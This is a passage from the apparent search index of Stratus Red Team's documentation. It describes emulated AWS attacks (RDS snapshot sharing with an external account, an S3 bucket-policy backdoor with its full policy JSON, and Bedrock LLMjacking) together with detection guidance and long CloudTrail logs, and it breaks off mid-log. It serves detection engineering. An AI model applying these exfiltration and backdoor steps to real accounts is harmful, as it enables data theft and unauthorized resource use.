\"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:28:02Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"756680937392\",\n      \"requestID\": \"aeddc4a7-2043-405e-8b19-5a913367249e\",\n      \"requestParameters\": {\n         \"attributeType\": \"CREATE_VOLUME_PERMISSION\",\n         \"createVolumePermission\": {\n            \"add\": {\n               \"items\": [\n                  {\n                     \"userId\": \"098797384747\"\n                  }\n               ]\n            }\n         },\n         \"snapshotId\": \"snap-041993b54a9b3af6f\"\n      },\n      \"responseElements\": {\n         \"_return\": true,\n         \"requestId\": \"aeddc4a7-2043-405e-8b19-5a913367249e\"\n      },\n      \"sourceIPAddress\": \"253.76.43.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.me-central-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_7fcd50f2-f1da-4c82-bb7d-38b82021b080\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAYLJU0B35TFSNKCS2\",\n         \"accountId\": \"756680937392\",\n         \"arn\": \"arn:aws:iam::756680937392:user/christophe\",\n         \"principalId\": \"AIDA7ETKRIUXU83QKECM\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.exfiltration.rds-share-snapshot/","title":"Exfiltrate RDS Snapshot by Sharing","text":"<p>slow idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.exfiltration.rds-share-snapshot/#mappings","title":"Mappings","text":"<ul> <li> <p>MITRE ATT&amp;CK</p> <ul> <li>Exfiltration</li> </ul> </li> <li> <p>Threat Technique Catalog for AWS:</p> <ul> <li>Resource Hijacking: Cloud Service Hijacking - Bedrock LLM Abuse (T1496.A007)</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.exfiltration.rds-share-snapshot/#description","title":"Description","text":"<p>Shares a RDS Snapshot with an external AWS account to simulate an attacker exfiltrating a database.</p> <p>Warm-up:</p> <ul> <li>Create a RDS Instance (slow, around 10 minutes)</li> <li>Create a RDS Snapshot</li> </ul> <p>Detonation:</p> <ul> <li>Call rds:ModifyDBSnapshotAttribute to share the snapshot with an external AWS account</li> </ul>"},{"location":"attack-techniques/AWS/aws.exfiltration.rds-share-snapshot/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.exfiltration.rds-share-snapshot\n</code></pre>"},{"location":"attack-techniques/AWS/aws.exfiltration.rds-share-snapshot/#detection","title":"Detection","text":"<p>Through CloudTrail's <code>ModifyDBSnapshotAttribute</code> event, when both:</p> <ul> <li><code>requestParameters.attributeName</code> is <code>restore</code></li> <li>and, <code>requestParameters.launchPermission</code> shows that the RDS snapshot was shared with a new or unknown AWS account, such as:</li> </ul> <pre><code>\"requestParameters\": {\n  \"dBSnapshotIdentifier\": \"my-db-snapshot\",\n  \"attributeName\": \"restore\"\n  \"valuesToAdd\": [\"193672423079\"],\n}</code></pre> <p>An attacker can also make an RDS snapshot completely public. In this case, the value of <code>valuesToAdd</code> is <code>[\"all\"]</code>. </p>"},{"location":"attack-techniques/AWS/aws.exfiltration.rds-share-snapshot/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li><code>rds:ModifyDBSnapshotAttribute</code></li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"meiso-eastwest-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"fef2bf02-bbea-4d0f-a91c-e6ccfe3fba46\",\n      \"eventName\": \"ModifyDBSnapshotAttribute\",\n      \"eventSource\": \"rds.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:38:06Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"171471557522\",\n      \"requestID\": \"3fd13676-52a0-4680-8491-71a8e28ea7f5\",\n      \"requestParameters\": {\n         \"attributeName\": \"restore\",\n         \"dBSnapshotIdentifier\": \"exfiltration\",\n         \"valuesToAdd\": [\n            \"503161813013\"\n         ]\n      },\n      \"responseElements\": {\n         \"dBSnapshotAttributes\": [\n            {\n               \"attributeName\": \"restore\",\n               \"attributeValues\": [\n                  \"503161813013\"\n               ]\n            }\n         ],\n         \"dBSnapshotIdentifier\": \"exfiltration\"\n      },\n      \"sourceIPAddress\": \"204.10.215.184\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"rds.meiso-eastwest-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5ca5319a-2127-4f13-a878-495bc59244b3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAIYTVC64GTXUFCS2X\",\n         \"accountId\": \"171471557522\",\n         \"arn\": \"arn:aws:iam::171471557522:user/christophe\",\n         \"principalId\": \"AIDA3MGXB5NR71XRJU40\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.exfiltration.s3-backdoor-bucket-policy/","title":"Backdoor an S3 Bucket via its Bucket Policy","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.exfiltration.s3-backdoor-bucket-policy/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Exfiltration</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.exfiltration.s3-backdoor-bucket-policy/#description","title":"Description","text":"<p>Exfiltrates data from an S3 bucket by backdooring its Bucket Policy to allow access from an external, fictitious AWS account.</p> <p>Warm-up: </p> <ul> <li>Create an S3 bucket.</li> </ul> <p>Detonation: </p> <ul> <li>Backdoor the S3 Bucket Policy by setting the following Bucket Policy:</li> </ul> <pre>\n<code>\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::193672423079:root\"\n      },\n      \"Action\": [\n        \"s3:GetObject\",\n        \"s3:GetBucketLocation\",\n        \"s3:ListBucket\"\n      ],\n      \"Resource\": [\n        \"arn:aws:s3:::%s/*\",\n        \"arn:aws:s3:::%s\"\n      ]\n    }\n  ]\n}\n</code>\n</pre>"},{"location":"attack-techniques/AWS/aws.exfiltration.s3-backdoor-bucket-policy/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.exfiltration.s3-backdoor-bucket-policy\n</code></pre>"},{"location":"attack-techniques/AWS/aws.exfiltration.s3-backdoor-bucket-policy/#detection","title":"Detection","text":"<ul> <li> <p>Using CloudTrail's <code>PutBucketPolicy</code> event.</p> </li> <li> <p>Through GuardDuty's Policy:S3/BucketAnonymousAccessGranted finding,  if the S3 bucket was made public (and not only shared with an attacker-controlled AWS account).</p> </li> <li> <p>Through IAM Access Analyzer, which generates a finding when an S3 bucket is made public or accessible from another account.</p> </li> </ul>"},{"location":"attack-techniques/AWS/aws.impact.bedrock-invoke-model/","title":"Invoke Bedrock Model","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.impact.bedrock-invoke-model/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Impact</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.impact.bedrock-invoke-model/#description","title":"Description","text":"<p>Simulates an attacker enumerating Bedrock models and then invoking the Anthropic Claude 3 Sonnet (<code>anthropic.claude-3-sonnet-20240229-v1:0</code>) model to run inference using an arbitrary prompt. LLMjacking is an attack vector where attackers use stolen cloud credentials to run large language models, leading to unauthorized inference.</p> <p>Warm-up: None.</p> <p>Detonation: </p> <ul> <li>If Anthropic Claude 3 Sonnet is not enabled, attempt to enable it using <code>PutUseCaseForModelAccess</code>, <code>ListFoundationModelAgreementOffers</code>, <code>CreateFoundationModelAgreement</code>, <code>PutFoundationModelEntitlement</code></li> <li>Call <code>bedrock:InvokeModel</code> to run inference using the model.</li> </ul> <p>References:</p> <ul> <li>https://permiso.io/blog/exploiting-hosted-models</li> <li>https://sysdig.com/blog/llmjacking-stolen-cloud-credentials-used-in-new-ai-attack/</li> <li>https://sysdig.com/blog/growing-dangers-of-llmjacking/</li> <li>https://www.lacework.com/blog/detecting-ai-resource-hijacking-with-composite-alerts</li> <li>https://reinforce.awsevents.com/content/dam/reinforce/2024/slides/TDR432_New-tactics-and-techniques-for-proactive-threat-detection.pdf</li> </ul> <p>Note</p> <p>This technique attempts to enable and invoke the Bedrock model anthropic.claude-3-sonnet-20240229-v1:0. To do this, it creates a Bedrock use case request for Anthropic models with a fictitious company name, website and use-case:</p> <ul> <li>Company Name: <code>test</code></li> <li>Company Website: <code>https://test.com</code></li> <li>Intended Users: <code>0</code></li> <li>Industry Option: <code>Government</code></li> <li>Use Cases: <code>None of the Above. test</code></li> </ul> <p>It is expected that this will cause AWS to automatically send you an email entitled <code>You accepted an AWS Marketplace offer</code>. If you want to use a different Anthropic model, you can set the <code>STRATUS_RED_TEAM_BEDROCK_MODEL</code> environment variable to the model ID you want to use (see the list here). Since the inputs to <code>InvokeModel</code> are model-specific, you can only specify an Anthropic model:</p> <ul> <li><code>anthropic.claude-v2</code></li> <li><code>anthropic.claude-v2:1</code></li> <li><code>anthropic.claude-3-sonnet-20240229-v1:0</code> (default)</li> <li><code>anthropic.claude-3-5-sonnet-20240620-v1:0</code></li> <li><code>anthropic.claude-3-haiku-20240307-v1:0</code></li> <li><code>anthropic.claude-instant-v1</code></li> </ul> <p>Note</p> <p>After enabling it, Stratus Red Team will not disable the Bedrock model. While this should not incur any additional costs, you can disable the model by going to the Model Access page in the AWS Management Console.</p>"},{"location":"attack-techniques/AWS/aws.impact.bedrock-invoke-model/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.impact.bedrock-invoke-model\n</code></pre>"},{"location":"attack-techniques/AWS/aws.impact.bedrock-invoke-model/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li> <p><code>bedrock:CreateFoundationModelAgreement</code></p> </li> <li> <p><code>bedrock:GetFoundationModelAvailability</code></p> </li> <li> <p><code>bedrock:InvokeModel</code></p> </li> <li> <p><code>bedrock:ListFoundationModelAgreementOffers</code></p> </li> <li> <p><code>bedrock:PutFoundationModelEntitlement</code></p> </li> <li> <p><code>bedrock:PutUseCaseForModelAccess</code></p> </li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"megov-northeast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"4031b2d2-5e47-4d71-9eda-4f22702c45f3\",\n      \"eventName\": \"PutFoundationModelEntitlement\",\n      \"eventSource\": \"bedrock.amazonaws.com\",\n      \"eventTime\": \"2024-10-17T20:09:52Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"494659789341\",\n      \"requestID\": \"ad8d9b62-bd64-4276-92bd-f8f6bc829370\",\n      \"requestParameters\": {\n         \"modelId\": \"anthropic.claude-3-sonnet-20240229-v1:0\"\n      },\n      \"responseElements\": {\n         \"status\": \"SUCCESS\"\n      },\n      \"sourceIPAddress\": \"035.249.253.232\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"bedrock.megov-northeast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_e0cb7ef1-0d48-463f-8988-277de94752b6\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA6FTSFH98XNF7DFZB\",\n         \"accountId\": \"494659789341\",\n         \"arn\": \"arn:aws:sts::494659789341:assumed-role/test-role/cli\",\n         \"principalId\": \"AROA2N7TQQRGKJYPCLOG0:cli\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-10-17T20:07:50Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"494659789341\",\n               \"arn\": \"arn:aws:iam::494659789341:role/test-role\",\n               \"principalId\": \"AROA2N7TQQRGKJYPCLOG0\",\n               \"type\": \"Role\",\n               \"userName\": \"test-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"megov-northeast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"8452e2fb-1252-460b-8f58-d3f5333c2630\",\n      \"eventName\": \"PutUseCaseForModelAccess\",\n      \"eventSource\": \"bedrock.amazonaws.com\",\n      \"eventTime\": \"2024-10-17T20:09:50Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"494659789341\",\n      \"requestID\": \"94150f81-8f6e-45f2-80d8-7f229db388eb\",\n      \"requestParameters\": null,\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"035.249.253.232\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"bedrock.megov-northeast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_e0cb7ef1-0d48-463f-8988-277de94752b6\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA6FTSFH98XNF7DFZB\",\n         \"accountId\": \"494659789341\",\n         \"arn\": \"arn:aws:sts::494659789341:assumed-role/test-role/cli\",\n         \"principalId\": \"AROA2N7TQQRGKJYPCLOG0:cli\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-10-17T20:07:50Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"494659789341\",\n               \"arn\": \"arn:aws:iam::494659789341:role/test-role\",\n               \"principalId\": \"AROA2N7TQQRGKJYPCLOG0\",\n               \"type\": \"Role\",\n               \"userName\": \"test-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"megov-northeast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"51d580ea-04f5-421c-b733-b5e4ec485a6e\",\n      \"eventName\": \"InvokeModel\",\n      \"eventSource\": \"bedrock.amazonaws.com\",\n      \"eventTime\": \"2024-10-17T20:11:24Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.10\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"494659789341\",\n      \"requestID\": \"021634af-f7c2-48a2-b140-98f50d47ede9\",\n      \"requestParameters\": {\n         \"modelId\": \"anthropic.claude-3-sonnet-20240229-v1:0\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"035.249.253.232\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"bedrock-runtime.megov-northeast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_e0cb7ef1-0d48-463f-8988-277de94752b6\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA6FTSFH98XNF7DFZB\",\n         \"accountId\": \"494659789341\",\n         \"arn\": \"arn:aws:sts::494659789341:assumed-role/test-role/cli\",\n         \"principalId\": \"AROA2N7TQQRGKJYPCLOG0:cli\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-10-17T20:07:50Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"494659789341\",\n               \"arn\": \"arn:aws:iam::494659789341:role/test-role\",\n               \"principalId\": \"AROA2N7TQQRGKJYPCLOG0\",\n               \"type\": \"Role\",\n               \"userName\": \"test-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"megov-northeast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"f12a2c9b-72a6-4e05-976a-72febda6a8f4\",\n      \"eventName\": \"GetFoundationModelAvailability\",\n      \"eventSource\": \"bedrock.amazonaws.com\",\n      \"eventTime\": \"2024-10-17T20:11:22Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"494659789341\",\n      \"requestID\": \"ae609148-2602-4c22-bc7a-9ba0bec018db\",\n      \"requestParameters\": {\n         \"modelId\": \"anthropic.claude-3-sonnet-20240229-v1:0\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"035.249.253.232\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"bedrock.megov-northeast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_e0cb7ef1-0d48-463f-8988-277de94752b6\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA6FTSFH98XNF7DFZB\",\n         \"accountId\": \"494659789341\",\n         \"arn\": \"arn:aws:sts::494659789341:assumed-role/test-role/cli\",\n         \"principalId\": \"AROA2N7TQQRGKJYPCLOG0:cli\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-10-17T20:07:50Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"494659789341\",\n               \"arn\": \"arn:aws:iam::494659789341:role/test-role\",\n               \"principalId\": \"AROA2N7TQQRGKJYPCLOG0\",\n               \"type\": \"Role\",\n               \"userName\": \"test-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"megov-northeast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"efe53b88-f160-4734-bb93-7b87bbe44d53\",\n      \"eventName\": \"GetFoundationModelAvailability\",\n      \"eventSource\": \"bedrock.amazonaws.com\",\n      \"eventTime\": \"2024-10-17T20:11:12Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"494659789341\",\n      \"requestID\": \"65736802-5857-4ce4-b330-e00b6f49b1bd\",\n      \"requestParameters\": {\n         \"modelId\": \"anthropic.claude-3-sonnet-20240229-v1:0\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"035.249.253.232\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"bedrock.megov-northeast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_e0cb7ef1-0d48-463f-8988-277de94752b6\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA6FTSFH98XNF7DFZB\",\n         \"accountId\": \"494659789341\",\n         \"arn\": \"arn:aws:sts::494659789341:assumed-role/test-role/cli\",\n         \"principalId\": \"AROA2N7TQQRGKJYPCLOG0:cli\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-10-17T20:07:50Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"494659789341\",\n               \"arn\": \"arn:aws:iam::494659789341:role/test-role\",\n               \"principalId\": \"AROA2N7TQQRGKJYPCLOG0\",\n               \"type\": \"Role\",\n               \"userName\": \"test-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"megov-northeast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"89557ced-3487-49ac-8fdc-f6cccd4883e5\",\n      \"eventName\": \"GetFoundationModelAvailability\",\n      \"eventSource\": \"bedrock.amazonaws.com\",\n      \"eventTime\": \"2024-10-17T20:11:02Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"494659789341\",\n      \"requestID\": \"2c542cf0-623f-44b1-9286-d8737d57b1e8\",\n      \"requestParameters\": {\n         \"modelId\": \"anthropic.claude-3-sonnet-20240229-v1:0\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"035.249.253.232\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"bedrock.megov-northeast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_e0cb7ef1-0d48-463f-8988-277de94752b6\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA6FTSFH98XNF7DFZB\",\n         \"accountId\": \"494659789341\",\n         \"arn\": \"arn:aws:sts::494659789341:assumed-role/test-role/cli\",\n         \"principalId\": \"AROA2N7TQQRGKJYPCLOG0:cli\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-10-17T20:07:50Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"494659789341\",\n               \"arn\": \"arn:aws:iam::494659789341:role/test-role\",\n               \"principalId\": \"AROA2N7TQQRGKJYPCLOG0\",\n               \"type\": \"Role\",\n               \"userName\": \"test-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"megov-northeast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"148d06be-26df-4d27-aba4-5ef0d7df6587\",\n      \"eventName\": \"GetFoundationModelAvailability\",\n      \"eventSource\": \"bedrock.amazonaws.com\",\n      \"eventTime\": \"2024-10-17T20:10:42Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"494659789341\",\n      \"requestID\": \"582e088b-5c11-46cf-9b26-fe61e8ed5bac\",\n      \"requestParameters\": {\n         \"modelId\": \"anthropic.claude-3-sonnet-20240229-v1:0\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"035.249.253.232\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"bedrock.megov-northeast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_e0cb7ef1-0d48-463f-8988-277de94752b6\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA6FTSFH98XNF7DFZB\",\n         \"accountId\": \"494659789341\",\n         \"arn\": \"arn:aws:sts::494659789341:assumed-role/test-role/cli\",\n         \"principalId\": \"AROA2N7TQQRGKJYPCLOG0:cli\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-10-17T20:07:50Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"494659789341\",\n               \"arn\": \"arn:aws:iam::494659789341:role/test-role\",\n               \"principalId\": \"AROA2N7TQQRGKJYPCLOG0\",\n               \"type\": \"Role\",\n               \"userName\": \"test-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"megov-northeast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"61956b65-a857-4e46-8352-9c8506b52e73\",\n      \"eventName\": \"GetFoundationModelAvailability\",\n      \"eventSource\": \"bedrock.amazonaws.com\",\n      \"eventTime\": \"2024-10-17T20:10:32Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"494659789341\",\n      \"requestID\": \"fb9252f0-5112-4a6a-b751-cd22715bb8de\",\n      \"requestParameters\": {\n         \"modelId\": \"anthropic.claude-3-sonnet-20240229-v1:0\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"035.249.253.232\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"bedrock.megov-northeast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_e0cb7ef1-0d48-463f-8988-277de94752b6\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA6FTSFH98XNF7DFZB\",\n         \"accountId\": \"494659789341\",\n         \"arn\": \"arn:aws:sts::494659789341:assumed-role/test-role/cli\",\n         \"principalId\": \"AROA2N7TQQRGKJYPCLOG0:cli\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-10-17T20:07:50Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"494659789341\",\n               \"arn\": \"arn:aws:iam::494659789341:role/test-role\",\n               \"principalId\": \"AROA2N7TQQRGKJYPCLOG0\",\n               \"type\": \"Role\",\n               \"userName\": \"test-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"megov-northeast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"0a6c7fce-ffb0-47f6-b2e0-e3493c501567\",\n      \"eventName\": \"GetFoundationModelAvailability\",\n      \"eventSource\": \"bedrock.amazonaws.com\",\n      \"eventTime\": \"2024-10-17T20:10:12Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"494659789341\",\n      \"requestID\": \"6abb5c47-1aa4-4c51-929f-28ba9954870f\",\n      \"requestParameters\": {\n         \"modelId\": \"anthropic.claude-3-sonnet-20240229-v1:0\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"035.249.253.232\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"bedrock.megov-northeast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_e0cb7ef1-0d48-463f-8988-277de94752b6\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA6FTSFH98XNF7DFZB\",\n         \"accountId\": \"494659789341\",\n         \"arn\": \"arn:aws:sts::494659789341:assumed-role/test-role/cli\",\n         \"principalId\": \"AROA2N7TQQRGKJYPCLOG0:cli\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-10-17T20:07:50Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"494659789341\",\n               \"arn\": \"arn:aws:iam::494659789341:role/test-role\",\n               \"principalId\": \"AROA2N7TQQRGKJYPCLOG0\",\n               \"type\": \"Role\",\n               \"userName\": \"test-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"megov-northeast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"db9c43df-ae6f-4db3-8298-f5f779f74f4d\",\n      \"eventName\": \"CreateFoundationModelAgreement\",\n      \"eventSource\": \"bedrock.amazonaws.com\",\n      \"eventTime\": \"2024-10-17T20:09:51Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"494659789341\",\n      \"requestID\": \"b133ab25-9785-491b-98bc-a5160e7c1b88\",\n      \"requestParameters\": {\n         \"modelId\": \"anthropic.claude-3-sonnet-20240229-v1:0\"\n      },\n      \"responseElements\": {\n         \"modelId\": \"anthropic.claude-3-sonnet-20240229-v1\"\n      },\n      \"sourceIPAddress\": \"035.249.253.232\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"bedrock.megov-northeast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_e0cb7ef1-0d48-463f-8988-277de94752b6\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA6FTSFH98XNF7DFZB\",\n         \"accountId\": \"494659789341\",\n         \"arn\": \"arn:aws:sts::494659789341:assumed-role/test-role/cli\",\n         \"principalId\": \"AROA2N7TQQRGKJYPCLOG0:cli\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-10-17T20:07:50Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"494659789341\",\n               